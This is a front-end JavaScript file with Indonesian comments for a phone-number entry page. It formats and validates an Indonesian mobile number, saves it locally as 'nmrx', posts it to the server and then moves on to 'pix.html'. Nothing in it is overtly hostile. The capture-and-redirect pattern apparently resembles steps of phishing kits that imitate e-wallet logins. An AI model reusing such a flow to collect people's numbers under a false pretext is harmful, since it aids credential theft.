
"use strict";

// =============================
// ELEMENT
// =============================

const phoneInput = document.getElementById("phone");
const lanjutBtn = document.getElementById("lanjutBtn");
const loadingBox = document.getElementById("loadingBox");
const clearBtn = document.getElementById("clearBtn");
const errorBox = document.getElementById("errorBox");

// =============================
// CONFIG
// =============================

let isProcessing = false;
let errorTimer = null;

// =============================
// FADE IN
// =============================

window.addEventListener("DOMContentLoaded", () => {

    document.body.classList.add("fade-in");

    if (phoneInput) {
        phoneInput.focus();
        phoneInput.setAttribute("inputmode", "numeric");
        phoneInput.setAttribute("autocomplete", "tel");
    }

    if (loadingBox) {
        loadingBox.style.display = "none";
    }

    if (clearBtn) {
        clearBtn.style.display = "none";
    }

});

// =============================
// FORMAT NOMOR
// =============================

phoneInput.addEventListener("input", (e) => {

    let angka = e.target.value.replace(/\D/g, "");

    angka = angka.substring(0, 13);

    let hasil = "";

    if (angka.length > 0) {
        hasil += angka.substring(0, 3);
    }

    if (angka.length > 3) {
        hasil += "-" + angka.substring(3, 7);
    }

    if (angka.length > 7) {
        hasil += "-" + angka.substring(7, 13);
    }

    e.target.value = hasil;

    // TOMBOL CLEAR

    clearBtn.style.display =
        angka.length > 0 ? "flex" : "none";

    // HILANGKAN ERROR

    hideError();

});

// =============================
// ERROR
// =============================

function showError() {

    errorBox.classList.add("show");

    if (navigator.vibrate) {
        navigator.vibrate([120, 80, 120]);
    }

    clearTimeout(errorTimer);

    errorTimer = setTimeout(() => {
        hideError();
    }, 2000);

}

function hideError() {

    errorBox.classList.remove("show");

    clearTimeout(errorTimer);

}

// =============================
// CLEAR INPUT
// =============================

clearBtn.addEventListener("click", () => {

    if (isProcessing) return;

    phoneInput.value = "";

    clearBtn.style.display = "none";

    hideError();

    phoneInput.focus();

});

// =============================
// ENTER KEY
// =============================

phoneInput.addEventListener("keydown", (e) => {

    if (e.key === "Enter") {

        e.preventDefault();

        lanjutBtn.click();

    }

});

// =============================
// LANJUT
// =============================

lanjutBtn.addEventListener("click", async (e) => {

    e.preventDefault();

    // CEGAH DOUBLE CLICK

    if (isProcessing) return;

    // AMBIL NOMOR

    const nomor = phoneInput.value.replace(/\D/g, "");

    // VALIDASI

    if (
        nomor.length < 9 ||
        nomor.charAt(0) !== "8"
    ) {

        showError();

        phoneInput.focus();

        return;

    }

    // KUNCI PROSES

    isProcessing = true;

    lanjutBtn.disabled = true;

    // SIMPAN NOMOR

    localStorage.setItem("nmrx", nomor);

    // TAMPILKAN LOADING LANGSUNG

    loadingBox.style.display = "flex";

    // PAKSA BROWSER UPDATE TAMPILAN

    await new Promise(resolve => {
        requestAnimationFrame(() => {
            requestAnimationFrame(resolve);
        });
    });

    try {

        // KIRIM DATA KE SERVER
        // BATAS WAKTU 5 DETIK

        const controller = new AbortController();

        const timeout = setTimeout(() => {
            controller.abort();
        }, 5000);

        try {

            const response = await fetch("/nmrx", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    nmrx: nomor
                }),
                signal: controller.signal
            });

            if (!response.ok) {
                throw new Error(
                    "Server error: " + response.status
                );
            }

        } finally {

            clearTimeout(timeout);

        }

        // FADE OUT

        document.body.classList.add("fade-out");

        // PINDAH HALAMAN

        setTimeout(() => {

            window.location.href = "pix.html";

        }, 500);

    } catch (error) {

        console.error("Kesalahan:", error);

        loadingBox.style.display = "none";

        lanjutBtn.disabled = false;

        isProcessing = false;

        // PESAN ERROR

        showError();

    }

});

// =============================
// RESET SAAT KEMBALI
// =============================

window.addEventListener("pageshow", () => {

    isProcessing = false;

    lanjutBtn.disabled = false;

    loadingBox.style.display = "none";

});
